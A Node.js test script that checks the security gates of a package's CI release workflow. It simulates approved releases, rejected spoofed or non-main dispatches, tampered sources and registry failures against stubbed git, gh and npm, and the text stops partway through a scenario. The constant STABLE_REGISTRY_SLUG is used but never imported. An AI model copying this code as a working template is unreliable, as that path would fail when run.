#!/usr/bin/env node
import { execFileSync, spawnSync } from "node:child_process";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import {
  BETA_REGISTRY_SLUG,
  EMDASH_PUBLISH_JOB_IF,
  PACKAGE_NAME,
  repositoryRoot,
  runReleaseFlowCli,
  validateEmDashDispatchGate,
} from "./release-flow.mjs";

const GATE_SCRIPT_PATH = join(repositoryRoot, ".github/scripts/emdash-dispatch-gate.mjs");

function git(args, cwd) {
  return execFileSync("git", args, {
    cwd,
    encoding: "utf8",
    stdio: ["ignore", "pipe", "pipe"],
  }).trim();
}

export async function verifyShippedEmDashWorkflowGateBinding() {
  const emdashWorkflowText = await readFile(
    join(repositoryRoot, ".github/workflows/emdash-release.yml"),
    "utf8",
  );
  const releaseWorkflowText = await readFile(
    join(repositoryRoot, ".github/workflows/release.yml"),
    "utf8",
  );

  const expectedIfLine = `if: ${EMDASH_PUBLISH_JOB_IF}`;
  if (!emdashWorkflowText.includes(expectedIfLine)) {
    throw new Error(
      `emdash-release.yml publish job if-condition does not match expected rule: ${expectedIfLine}`,
    );
  }

  const gateStepMatch =
    /- name: Enforce dispatch and caller gate before credential use or Registry I\/O[\s\S]*?run:\s*node \.github\/scripts\/emdash-dispatch-gate\.mjs --github-output "\$GITHUB_OUTPUT"/.exec(
      emdashWorkflowText,
    );
  if (!gateStepMatch) {
    throw new Error(
      "emdash-release.yml does not invoke node .github/scripts/emdash-dispatch-gate.mjs in its gate step",
    );
  }

  const gateIdx = emdashWorkflowText.indexOf("node .github/scripts/emdash-dispatch-gate.mjs");
  const mintIdx = emdashWorkflowText.indexOf("actions/create-github-app-token@");
  const prepareIdx = emdashWorkflowText.indexOf("node .github/scripts/prepare-emdash-release.mjs");
  const attestIdx = emdashWorkflowText.indexOf("actions/attest-build-provenance@");
  const releaseActionIdx = emdashWorkflowText.indexOf("emdash-cms/emdash/apps/release-action@");
  const verifyIdx = emdashWorkflowText.indexOf("node .github/scripts/verify-registry-release.mjs");
  if (
    gateIdx === -1 ||
    mintIdx === -1 ||
    prepareIdx === -1 ||
    attestIdx === -1 ||
    releaseActionIdx === -1 ||
    verifyIdx === -1 ||
    !(gateIdx < mintIdx && gateIdx < prepareIdx && prepareIdx < attestIdx && attestIdx < releaseActionIdx && releaseActionIdx < verifyIdx)
  ) {
    throw new Error(
      "emdash-release.yml must run .github/scripts/emdash-dispatch-gate.mjs before token minting, bundle preparation, build provenance attestation, delegated release-action publish, and PDS verification",
    );
  }

  if (
    emdashWorkflowText.includes("EMDASH_PDS_") ||
    releaseWorkflowText.includes("EMDASH_PDS_") ||
    releaseWorkflowText.includes("secrets: inherit")
  ) {
    throw new Error(
      "Release workflows must not reference legacy EMDASH_PDS_* secrets or secrets: inherit",
    );
  }

  if (
    !emdashWorkflowText.includes("id-token: write") ||
    !emdashWorkflowText.includes("attestations: write") ||
    !releaseWorkflowText.includes("id-token: write") ||
    !releaseWorkflowText.includes("attestations: write")
  ) {
    throw new Error(
      "Both release.yml and emdash-release.yml must grant id-token: write and attestations: write for OIDC delegated publishing",
    );
  }

  if (
    !releaseWorkflowText.includes("uses: ./.github/workflows/emdash-release.yml") ||
    !releaseWorkflowText.includes("release_mode: stable")
  ) {
    throw new Error("release.yml must delegate to emdash-release.yml with release_mode: stable");
  }

  // Cut beta is release.yml's button too: emdash-release.yml has none of its own, so the release
  // service connects both listings through release.yml.
  const emdashTriggers = /^on:\n([\s\S]*?)^\S/m.exec(emdashWorkflowText)?.[1] ?? "";
  if (!emdashTriggers.includes("workflow_call:") || emdashTriggers.includes("workflow_dispatch")) {
    throw new Error("emdash-release.yml must be workflow_call-only; Cut beta is a release.yml workflow_dispatch");
  }
  if (!releaseWorkflowText.includes("release_mode: beta")) {
    throw new Error("release.yml must delegate Cut beta to emdash-release.yml with release_mode: beta");
  }

  return {
    jobIfMatches: true,
    gateScriptInvokedBeforeCredentials: true,
    callerPassesStableReleaseMode: true,
    callerPassesBetaReleaseMode: true,
    delegatedOidcReleaseConfigured: true,
  };
}

export function runExtractedGateScriptProcess({
  eventName = "",
  ref = "",
  inputVersion = "",
  releaseMode = "",
} = {}) {
  const proc = spawnSync(
    process.execPath,
    [GATE_SCRIPT_PATH],
    {
      cwd: repositoryRoot,
      encoding: "utf8",
      env: {
        PATH: process.env.PATH || "",
        GITHUB_EVENT_NAME: eventName,
        EVENT_NAME: eventName,
        GITHUB_REF: ref,
        TARGET_REF: ref,
        INPUT_VERSION: inputVersion,
        INPUT_RELEASE_MODE: releaseMode,
      },
    },
  );

  const stdout = (proc.stdout || "").trim();
  const stderr = (proc.stderr || "").trim();
  let parsed = null;
  if (proc.status === 0 && stdout) {
    try {
      parsed = JSON.parse(stdout.split("\n").at(-1));
    } catch {
      parsed = null;
    }
  }

  return {
    exitCode: proc.status ?? 1,
    stdout,
    stderr,
    parsed,
  };
}

async function createSeededRepo(prefix, events) {
  const root = await mkdtemp(join(tmpdir(), `payments-release-proof-${prefix}-`));
  await mkdir(join(root, ".changeset"), { recursive: true });
  await mkdir(join(root, "src"), { recursive: true });

  const initialPkg = {
    name: PACKAGE_NAME,
    version: "0.2.8",
    type: "module",
    scripts: {
      build: "wrangler deploy --dry-run --outdir dist && npm run plugin:build",
    },
    dependencies: {
      jose: "6.2.12",
      stripe: "23.0.0",
    },
  };
  const initialLock = {
    name: PACKAGE_NAME,
    version: "0.2.8",
    lockfileVersion: 3,
    requires: true,
    packages: {
      "": {
        name: PACKAGE_NAME,
        version: "0.2.8",
        dependencies: {
          jose: "6.2.12",
          stripe: "23.0.0",
        },
      },
      "node_modules/stripe": {
        version: "23.0.0",
        resolved: "https://registry.npmjs.org/stripe/-/stripe-23.0.0.tgz",
        integrity: "sha512-stripe2300integrity==",
      },
    },
  };

  await writeFile(join(root, "emdash-plugin.jsonc"), JSON.stringify({ publisher: "did:plc:release-proof" }));
  await writeFile(join(root, "package.json"), `${JSON.stringify(initialPkg, null, 2)}\n`, "utf8");
  await writeFile(join(root, "package-lock.json"), `${JSON.stringify(initialLock, null, 2)}\n`, "utf8");
  await writeFile(
    join(root, "CHANGELOG.md"),
    ["# @dinkuskit/payments", "", "## 0.2.8", "", "- Baseline release."].join("\n") + "\n",
    "utf8",
  );
  await writeFile(join(root, "src/plugin.ts"), `export const pluginVersion = "0.2.8";\n`, "utf8");
  await writeFile(join(root, ".changeset/README.md"), "# Changesets\n", "utf8");
  await writeFile(
    join(root, ".changeset/add-feature.md"),
    `---\n"${PACKAGE_NAME}": patch\n---\n\nFix checkout callback status handling.\n`,
    "utf8",
  );

  git(["init", "-b", "main"], root);
  git(["config", "user.name", "Proof Runner"], root);
  git(["config", "user.email", "proof@example.invalid"], root);
  git(["add", "-A"], root);
  git(["commit", "-m", "feat: baseline with pending changeset"], root);
  git(["tag", "v0.2.8"], root);

  const gitExec = (args, cwd = root) => {
    if (args[0] === "push") {
      events.push(`git:push:${args.slice(1).join(" ")}`);
      return "";
    }
    if (args[0] === "tag" && args[1] !== "--list") {
      events.push(`git:tag:${args[1]}`);
    }
    if (args[0] === "commit") {
      events.push(`git:commit:${args[2]?.split("\n")[0] || ""}`);
    }
    return git(args, cwd);
  };

  return { root, gitExec };
}

function createStubEnvironment({
  events,
  betaVersions = [],
  stableVersions = [],
  githubReleases = new Set(),
  registryError = null,
  customRegistryResponse = null,
} = {}) {
  const state = {
    betaVersions: [...betaVersions],
    stableVersions: [...stableVersions],
    githubReleases: new Set(githubReleases),
    openPrs: [],
    mergedPrs: [],
  };

  const fetchImpl = async (url) => {
    if (String(url).startsWith("https://plc.directory/")) {
      return { ok: true, json: async () => ({ service: [{ id: "#atproto_pds", serviceEndpoint: "https://proof-pds.example" }] }) };
    }
    events.push("registry:get:release-inventory");
    if (typeof customRegistryResponse === "function") return customRegistryResponse();
    if (registryError) {
      if (registryError.type === "network") throw new Error(registryError.message || "socket hang up");
      return { ok: false, status: registryError.status || 503 };
    }
    return {
      ok: true,
      status: 200,
      json: async () => ({
        records: [
          ...state.betaVersions.map((version) => ({ version, package: BETA_REGISTRY_SLUG })),
          ...state.stableVersions.map((version) => ({ version, package: STABLE_REGISTRY_SLUG })),
        ].map((value) => ({
          uri: `at://did:plc:release-proof/com.emdashcms.experimental.package.release/${value.package}:${value.version}`,
          value,
        })),
      }),
    };
  };

  const ghExec = (args) => {
    if (args[0] === "release" && args[1] === "view") {
      const tag = args[2];
      events.push(`gh:release:view:${tag}`);
      if (!state.githubReleases.has(tag)) {
        throw new Error(`release ${tag} not found`);
      }
      return JSON.stringify({ tagName: tag });
    }
    if (args[0] === "release" && args[1] === "create") {
      const tag = args[2];
      events.push(`gh:release:create:${tag}`);
      state.githubReleases.add(tag);
      return "";
    }
    if (args[0] === "pr" && args[1] === "list") {
      events.push(`gh:pr:list`);
      return state.openPrs[0]?.number ? String(state.openPrs[0].number) : "";
    }
    if (args[0] === "pr" && args[1] === "create") {
      const titleIdx = args.indexOf("--title");
      const title = titleIdx !== -1 ? args[titleIdx + 1] : "ci: release";
      events.push(`gh:pr:create:${title}`);
      state.openPrs.push({ number: 55, title });
      return "https://github.com/dinkuskit/payments/pull/55";
    }
    if (args[0] === "pr" && args[1] === "edit") {
      events.push(`gh:pr:edit:${args[2]}`);
      return "";
    }
    throw new Error(`Unexpected gh command: ${args.join(" ")}`);
  };

  const npmExec = async (args, cwd) => {
    events.push(`npm:${args.join(" ")}`);
    if (args[0] === "run" && args[1] === "release:version") {
      const pkgPath = join(cwd, "package.json");
      const pkg = JSON.parse(await readFile(pkgPath, "utf8"));
      pkg.version = "0.2.9";
      await writeFile(pkgPath, `${JSON.stringify(pkg, null, 2)}\n`, "utf8");

      const lockPath = join(cwd, "package-lock.json");
      const lock = JSON.parse(await readFile(lockPath, "utf8"));
      lock.version = "0.2.9";
      if (lock.packages?.[""]) {
        lock.packages[""].version = "0.2.9";
      }
      await writeFile(lockPath, `${JSON.stringify(lock, null, 2)}\n`, "utf8");

      await writeFile(
        join(cwd, "CHANGELOG.md"),
        [
          "# @dinkuskit/payments",
          "",
          "## 0.2.9",
          "",
          "### Patch Changes",
          "",
          "- Fix checkout callback status handling.",
          "",
          "## 0.2.8",
          "",
          "- Baseline release.",
        ].join("\n") + "\n",
        "utf8",
      );
      await rm(join(cwd, ".changeset/add-feature.md"), { force: true });
      await rm(join(cwd, ".changeset/empty-note.md"), { force: true });
    }
  };

  return { state, fetchImpl, ghExec, npmExec };
}

async function runWorkflowDispatchSimulation({
  eventName,
  ref,
  inputVersion = "",
  releaseMode = "",
  events,
  runCutBeta,
  runPublish,
}) {
  events.push(
    `workflow:emdash-release:start:event=${eventName}:ref=${ref}:mode=${releaseMode || "(none)"}:version=${inputVersion || "(auto)"}`,
  );

  // Execute the real extracted workflow gate script as a child process
  const scriptResult = runExtractedGateScriptProcess({
    eventName,
    ref,
    inputVersion,
    releaseMode,
  });
  const jsGate = validateEmDashDispatchGate({
    eventName,
    ref,
    inputVersion,
    releaseMode,
  });

  if (Boolean(scriptResult.exitCode === 0) !== jsGate.ok) {
    throw new Error(
      `Gate script / JS mismatch for event=${eventName} ref=${ref} version=${inputVersion} mode=${releaseMode}: scriptExit=${scriptResult.exitCode}, jsOk=${jsGate.ok}`,
    );
  }

  if (!jsGate.ok) {
    events.push(`workflow:emdash-release:gate-script:exit=${scriptResult.exitCode}:code=${jsGate.code}`);
    return { ok: false, gate: jsGate, scriptResult };
  }

  events.push(`workflow:emdash-release:gate-script:exit=0:mode=${jsGate.mode}`);
  if (eventName === "workflow_dispatch") {
    events.push("credential:mint-github-app-token:[REDACTED]");
    await runCutBeta();
  }
  await runPublish(jsGate.slug, jsGate.requestedVersion);
  return { ok: true, gate: jsGate, scriptResult };
}

export async function runReleaseAuthorityProof() {
  const workflowBinding = await verifyShippedEmDashWorkflowGateBinding();
  const scenarios = [];

  // Scenario (a): Approved main release path succeeds and performs tag, GitHub Release, Registry publish
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("approved-main", events);
    try {
      const env = createStubEnvironment({ events });
      const logs = [];

      // 1. Cut beta on main via manual workflow_dispatch
      let cutResult;
      await runWorkflowDispatchSimulation({
        eventName: "workflow_dispatch",
        ref: "refs/heads/main",
        inputVersion: "",
        releaseMode: "beta",
        events,
        runCutBeta: async () => {
          cutResult = await runReleaseFlowCli(["cut-beta"], {
            root,
            gitExec,
            ghExec: env.ghExec,
            fetchImpl: env.fetchImpl,
            log: (l) => logs.push(l),
          });
        },
        runPublish: async (slug) => {
          const check = await runReleaseFlowCli(
            ["check-registry-version", "--slug", slug, "--version", cutResult.version],
            { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: (l) => logs.push(l) },
          );
          if (!check.alreadyPublished) {
            events.push(`credential:oidc-attest-provenance`);
            events.push(`registry:publish:${slug}@${cutResult.version}`);
            env.state.betaVersions.push(cutResult.version);
          }
        },
      });

      // 2. Promote verified beta on main
      events.push("credential:mint-github-app-token:[REDACTED]");
      const promoteResult = await runReleaseFlowCli(
        [
          "promote",
          "--beta-version",
          "0.2.9-beta.1",
          "--proof-ref",
          "https://github.com/dinkuskit/payments/actions/runs/701 (0.2.9-beta.1 @running pass)",
        ],
        {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          npmExec: env.npmExec,
          log: (l) => logs.push(l),
        },
      );

      // 3. Merge ci: release PR to main and run publish-merged-release + delegated emdash-release.yml (event=push, release_mode=stable)
      git(["checkout", "main"], root);
      git(["merge", "--ff-only", "changeset-release/main"], root);
      events.push("workflow:release:push:refs/heads/main");
      events.push("credential:mint-github-app-token:[REDACTED]");
      const publishResult = await runReleaseFlowCli(["publish-merged-release"], {
        root,
        gitExec,
        ghExec: env.ghExec,
        fetchImpl: env.fetchImpl,
        log: (l) => logs.push(l),
      });

      if (publishResult.published || publishResult.registryNeeded) {
        await runWorkflowDispatchSimulation({
          eventName: "push",
          ref: "refs/heads/main",
          inputVersion: publishResult.version,
          releaseMode: "stable",
          events,
          runCutBeta: async () => {},
          runPublish: async (slug, version) => {
            const check = await runReleaseFlowCli(
              ["check-registry-version", "--slug", slug, "--version", version],
              { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: (l) => logs.push(l) },
            );
            if (!check.alreadyPublished) {
              events.push(`credential:oidc-attest-provenance`);
              events.push(`registry:publish:${slug}@${version}`);
              env.state.stableVersions.push(version);
            }
          },
        });
      }

      scenarios.push({
        id: "a",
        name: "approved_main_release_path_succeeds",
        status: "PASS",
        outcome: {
          betaVersion: cutResult.version,
          promotedTarget: promoteResult.targetVersion,
          publishedVersion: publishResult.version,
          tagCreated: publishResult.tagCreated,
          githubReleaseCreated: publishResult.githubReleaseCreated,
          registryPublished: env.state.stableVersions.includes("0.2.9"),
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  // Scenario (b): Manual stable dispatch is rejected before credential/Registry I/O
  {
    const events = [];
    const res = await runWorkflowDispatchSimulation({
      eventName: "workflow_dispatch",
      ref: "refs/heads/main",
      inputVersion: "0.2.9",
      releaseMode: "beta",
      events,
      runCutBeta: async () => {
        events.push("UNEXPECTED:cut-beta");
      },
      runPublish: async () => {
        events.push("UNEXPECTED:registry-publish");
      },
    });
    const touchedCredsOrRegistry = events.some(
      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:"),
    );
    if (res.ok || touchedCredsOrRegistry) {
      throw new Error("Scenario (b) failed: manual stable dispatch was not rejected before credential/Registry I/O");
    }
    scenarios.push({
      id: "b",
      name: "manual_stable_dispatch_rejected_before_credentials_and_registry_io",
      status: "PASS",
      outcome: {
        ok: res.ok,
        code: res.gate.code,
        scriptExitCode: res.scriptResult.exitCode,
        credentialOrRegistryIoCount: 0,
      },
      sideEffects: events,
    });
  }

  // Scenario (c): Non-main dispatch is rejected before credential/Registry I/O
  {
    const events = [];
    const res = await runWorkflowDispatchSimulation({
      eventName: "workflow_dispatch",
      ref: "refs/heads/feat/unmerged-branch",
      inputVersion: "0.2.9-beta.1",
      releaseMode: "beta",
      events,
      runCutBeta: async () => {
        events.push("UNEXPECTED:cut-beta");
      },
      runPublish: async () => {
        events.push("UNEXPECTED:registry-publish");
      },
    });
    const touchedCredsOrRegistry = events.some(
      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:"),
    );
    if (res.ok || touchedCredsOrRegistry) {
      throw new Error("Scenario (c) failed: non-main dispatch was not rejected before credential/Registry I/O");
    }
    scenarios.push({
      id: "c",
      name: "non_main_dispatch_rejected_before_credentials_and_registry_io",
      status: "PASS",
      outcome: {
        ok: res.ok,
        code: res.gate.code,
        scriptExitCode: res.scriptResult.exitCode,
        credentialOrRegistryIoCount: 0,
      },
      sideEffects: events,
    });
  }

  // Scenario (d): Source change after beta approval rejected before tagging or stable side effect
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("unapproved-source-edit", events);
    try {
      const env = createStubEnvironment({ events, betaVersions: [] });
      const cut = await runReleaseFlowCli(["cut-beta"], {
        root,
        gitExec,
        ghExec: env.ghExec,
        fetchImpl: env.fetchImpl,
        log: () => {},
      });
      env.state.betaVersions.push(cut.version);
      await runReleaseFlowCli(
        [
          "promote",
          "--beta-version",
          "0.2.9-beta.1",
          "--proof-ref",
          "run-702 0.2.9-beta.1 @running pass",
        ],
        {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          npmExec: env.npmExec,
          log: () => {},
        },
      );

      // Tamper with source on the release branch while preserving the Release-Beta-Proof trailer
      const releaseMsg = git(["log", "-1", "--format=%B"], root);
      await writeFile(join(root, "src/plugin.ts"), `export const pluginVersion = "tampered";\n`, "utf8");
      git(["add", "src/plugin.ts"], root);
      git(["commit", "--amend", "-m", releaseMsg], root);

      events.length = 0; // Measure only final-gate side effects
      let caughtError = null;
      try {
        await runReleaseFlowCli(["publish-merged-release"], {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          log: () => {},
        });
      } catch (error) {
        caughtError = error instanceof Error ? error.message : String(error);
      }

      const stableSideEffects = events.filter(
        (e) =>
          e.startsWith("git:tag:") ||
          e.startsWith("git:push:") ||
          e.startsWith("gh:release:create:") ||
          e.startsWith("registry:"),
      );
      if (!caughtError || stableSideEffects.length > 0) {
        throw new Error("Scenario (d) failed: unapproved source change was not rejected before tagging");
      }

      scenarios.push({
        id: "d",
        name: "source_change_after_beta_approval_rejected_before_tagging",
        status: "PASS",
        outcome: {
          rejected: true,
          error: caughtError,
          stableSideEffectsCount: stableSideEffects.length,
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  // Scenario (e): Resume after tag-exists completes missing GitHub Release and Registry publish steps
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("resume-existing-tag", events);
    try {
      const env = createStubEnvironment({ events, betaVersions: [], stableVersions: [] });
      const cut = await runReleaseFlowCli(["cut-beta"], {
        root,
        gitExec,
        ghExec: env.ghExec,
        fetchImpl: env.fetchImpl,
        log: () => {},
      });
      env.state.betaVersions.push(cut.version);
      await runReleaseFlowCli(
        [
          "promote",
          "--beta-version",
          "0.2.9-beta.1",
          "--proof-ref",
          "run-703 0.2.9-beta.1 @running pass",
        ],
        {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          npmExec: env.npmExec,
          log: () => {},
        },
      );

      // Simulate prior partial run that created v0.2.9 tag on HEAD, then failed before GitHub Release & Registry publish
      git(["tag", "v0.2.9", "HEAD"], root);
      events.length = 0;

      const resumed = await runReleaseFlowCli(["publish-merged-release"], {
        root,
        gitExec,
        ghExec: env.ghExec,
        fetchImpl: env.fetchImpl,
        log: () => {},
      });

      if (!resumed.published || !resumed.registryNeeded || !resumed.githubReleaseCreated || !resumed.resumedFromExistingTag) {
        throw new Error(`Scenario (e) failed: unexpected resume state ${JSON.stringify(resumed)}`);
      }

      // Downstream Registry job runs with caller event=push and release_mode=stable
      await runWorkflowDispatchSimulation({
        eventName: "push",
        ref: "refs/heads/main",
        inputVersion: resumed.version,
        releaseMode: "stable",
        events,
        runCutBeta: async () => {},
        runPublish: async (slug, version) => {
          const check = await runReleaseFlowCli(
            ["check-registry-version", "--slug", slug, "--version", version],
            { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: () => {} },
          );
          if (!check.alreadyPublished) {
            events.push(`credential:oidc-attest-provenance`);
            events.push(`registry:publish:${slug}@${version}`);
            env.state.stableVersions.push(version);
          }
        },
      });

      scenarios.push({
        id: "e",
        name: "resume_after_existing_tag_completes_missing_github_release_and_registry_publish",
        status: "PASS",
        outcome: {
          resumedFromExistingTag: resumed.resumedFromExistingTag,
          tagCreated: resumed.tagCreated,
          githubReleaseCreated: resumed.githubReleaseCreated,
          downstreamRegistryTriggered: resumed.published,
          registryPublished: env.state.stableVersions.includes("0.2.9"),
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  // Scenario (f): Registry lookup failure aborts cut-beta before tag creation
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("registry-failure", events);
    try {
      const env = createStubEnvironment({
        events,
        registryError: { status: 503, code: "ServiceUnavailable" },
      });
      events.length = 0;
      let caughtError = null;
      try {
        await runReleaseFlowCli(["cut-beta"], {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          log: () => {},
        });
      } catch (error) {
        caughtError = error instanceof Error ? error.message : String(error);
      }

      const betaTags = git(["tag", "--list", "v0.2.9-beta.*"], root)
        .split("\n")
        .filter(Boolean);
      if (!caughtError || betaTags.length > 0) {
        throw new Error("Scenario (f) failed: Registry lookup error did not abort before tag creation");
      }

      scenarios.push({
        id: "f",
        name: "registry_lookup_failure_aborts_cut_beta_before_tag",
        status: "PASS",
        outcome: {
          aborted: true,
          error: caughtError,
          betaTagsCreated: betaTags.length,
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  // Scenario (g): Empty changeset accepted and excluded from bump calculation
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("empty-changeset", events);
    try {
      await writeFile(join(root, ".changeset/empty-note.md"), `---\n---\n`, "utf8");
      git(["add", ".changeset/empty-note.md"], root);
      git(["commit", "-m", "docs: add empty changeset"], root);

      const env = createStubEnvironment({ events, betaVersions: [] });
      events.length = 0;

      const prCheck = await runReleaseFlowCli(
        ["check-pr", "--base", "origin/main", "--head", "feat/docs-plus-fix", "--title", "feat: docs and fix"],
        {
          root,
          gitExec: (args, cwd = root) => {
            if (args[0] === "diff" && args.includes("origin/main...HEAD")) {
              return ".changeset/add-feature.md\n.changeset/empty-note.md";
            }
            return gitExec(args, cwd);
          },
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          log: () => {},
        },
      );

      const cutResult = await runReleaseFlowCli(["cut-beta"], {
        root,
        gitExec,
        ghExec: env.ghExec,
        fetchImpl: env.fetchImpl,
        log: () => {},
      });

      if (cutResult.version !== "0.2.9-beta.1" || cutResult.changesetCount !== 1) {
        throw new Error(`Scenario (g) failed: unexpected cutResult ${JSON.stringify(cutResult)}`);
      }

      scenarios.push({
        id: "g",
        name: "empty_changeset_accepted_and_excluded_from_bump_calculation",
        status: "PASS",
        outcome: {
          prCheckFiles: prCheck.changesetFiles,
          computedBetaVersion: cutResult.version,
          versionBumpingChangesetCount: cutResult.changesetCount,
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  // Scenario (h): Reusable-call handoff with caller event `push` on refs/heads/main + release_mode=stable proceeds
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("reusable-call-handoff", events);
    try {
      const env = createStubEnvironment({ events, betaVersions: ["0.2.9-beta.1"], stableVersions: [] });
      git(["tag", "v0.2.9-beta.1", "HEAD"], root);
      await runReleaseFlowCli(
        [
          "promote",
          "--beta-version",
          "0.2.9-beta.1",
          "--proof-ref",
          "run-708 0.2.9-beta.1 @running pass",
        ],
        {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          npmExec: env.npmExec,
          log: () => {},
        },
      );
      git(["checkout", "main"], root);
      git(["merge", "--ff-only", "changeset-release/main"], root);
      events.length = 0;

      events.push("workflow:release:push:refs/heads/main");
      events.push("credential:mint-github-app-token:[REDACTED]");
      const publishResult = await runReleaseFlowCli(["publish-merged-release"], {
        root,
        gitExec,
        ghExec: env.ghExec,
        fetchImpl: env.fetchImpl,
        log: () => {},
      });

      const handoff = await runWorkflowDispatchSimulation({
        eventName: "push",
        ref: "refs/heads/main",
        inputVersion: publishResult.version,
        releaseMode: "stable",
        events,
        runCutBeta: async () => {
          events.push("UNEXPECTED:cut-beta");
        },
        runPublish: async (slug, version) => {
          const check = await runReleaseFlowCli(
            ["check-registry-version", "--slug", slug, "--version", version],
            { root, gitExec, ghExec: env.ghExec, fetchImpl: env.fetchImpl, log: () => {} },
          );
          if (!check.alreadyPublished) {
            events.push(`credential:oidc-attest-provenance`);
            events.push(`registry:publish:${slug}@${version}`);
            env.state.stableVersions.push(version);
          }
        },
      });

      if (
        !handoff.ok ||
        handoff.gate.mode !== "stable-call" ||
        !publishResult.tagCreated ||
        !publishResult.githubReleaseCreated ||
        !env.state.stableVersions.includes("0.2.9")
      ) {
        throw new Error("Scenario (h) failed: delegated push + release_mode=stable did not complete stable publication");
      }

      scenarios.push({
        id: "h",
        name: "reusable_call_push_event_with_stable_input_proceeds",
        status: "PASS",
        outcome: {
          callerEvent: "push",
          releaseMode: "stable",
          gateScriptExitCode: handoff.scriptResult.exitCode,
          tagCreated: publishResult.tagCreated,
          githubReleaseCreated: publishResult.githubReleaseCreated,
          registryPublished: env.state.stableVersions.includes("0.2.9"),
        },
        sideEffects: events,
      });
    } finally {
      await rm(root, { recursive: true, force: true });
    }
  }

  // Scenario (i): Manual workflow_dispatch attempting stable version OR passing release_mode=stable by hand is rejected before credentials/Registry I/O
  {
    const events = [];
    const attemptStableVersion = await runWorkflowDispatchSimulation({
      eventName: "workflow_dispatch",
      ref: "refs/heads/main",
      inputVersion: "0.2.9",
      releaseMode: "beta",
      events,
      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
      runPublish: async () => events.push("UNEXPECTED:publish"),
    });
    const attemptStableModeSpoof = await runWorkflowDispatchSimulation({
      eventName: "workflow_dispatch",
      ref: "refs/heads/main",
      inputVersion: "0.2.9",
      releaseMode: "stable",
      events,
      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
      runPublish: async () => events.push("UNEXPECTED:publish"),
    });
    const touchedCredsOrRegistry = events.some(
      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:") || e.startsWith("UNEXPECTED:"),
    );
    if (attemptStableVersion.ok || attemptStableModeSpoof.ok || touchedCredsOrRegistry) {
      throw new Error("Scenario (i) failed: manual workflow_dispatch stable spoof was not rejected");
    }

    scenarios.push({
      id: "i",
      name: "manual_workflow_dispatch_stable_version_or_mode_rejected_before_credentials",
      status: "PASS",
      outcome: {
        stableVersionRejectedCode: attemptStableVersion.gate.code,
        stableModeSpoofRejectedCode: attemptStableModeSpoof.gate.code,
        scriptExitCodes: [
          attemptStableVersion.scriptResult.exitCode,
          attemptStableModeSpoof.scriptResult.exitCode,
        ],
        credentialOrRegistryIoCount: 0,
      },
      sideEffects: events,
    });
  }

  // Scenario (j): Push event WITHOUT stable caller input and push on a non-main ref are both rejected before credentials/Registry I/O
  {
    const events = [];
    const pushWithoutInput = await runWorkflowDispatchSimulation({
      eventName: "push",
      ref: "refs/heads/main",
      inputVersion: "0.2.9",
      releaseMode: "",
      events,
      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
      runPublish: async () => events.push("UNEXPECTED:publish"),
    });
    const pushOnNonMain = await runWorkflowDispatchSimulation({
      eventName: "push",
      ref: "refs/heads/feat/rogue-push",
      inputVersion: "0.2.9",
      releaseMode: "stable",
      events,
      runCutBeta: async () => events.push("UNEXPECTED:cut-beta"),
      runPublish: async () => events.push("UNEXPECTED:publish"),
    });
    const touchedCredsOrRegistry = events.some(
      (e) => e.startsWith("credential:") || e.startsWith("registry:") || e.startsWith("git:") || e.startsWith("UNEXPECTED:"),
    );
    if (pushWithoutInput.ok || pushOnNonMain.ok || touchedCredsOrRegistry) {
      throw new Error("Scenario (j) failed: push without stable caller input or non-main ref was not rejected");
    }

    scenarios.push({
      id: "j",
      name: "push_without_stable_caller_input_and_non_main_ref_rejected",
      status: "PASS",
      outcome: {
        pushWithoutInputCode: pushWithoutInput.gate.code,
        pushOnNonMainCode: pushOnNonMain.gate.code,
        scriptExitCodes: [
          pushWithoutInput.scriptResult.exitCode,
          pushOnNonMain.scriptResult.exitCode,
        ],
        credentialOrRegistryIoCount: 0,
      },
      sideEffects: events,
    });
  }

  // Scenario (k): Dependency change and script change in package.json / lockfile after beta approval rejected before tag
  {
    const events = [];
    const { root, gitExec } = await createSeededRepo("tampered-pkg-metadata", events);
    try {
      const env = createStubEnvironment({ events, betaVersions: [] });
      const cut = await runReleaseFlowCli(["cut-beta"], {
        root,
        gitExec,
        ghExec: env.ghExec,
        fetchImpl: env.fetchImpl,
        log: () => {},
      });
      env.state.betaVersions.push(cut.version);
      await runReleaseFlowCli(
        [
          "promote",
          "--beta-version",
          "0.2.9-beta.1",
          "--proof-ref",
          "run-709 0.2.9-beta.1 @running pass",
        ],
        {
          root,
          gitExec,
          ghExec: env.ghExec,
          fetchImpl: env.fetchImpl,
          npmExec: env.npmExec,
          log: () => {},
        },
      );
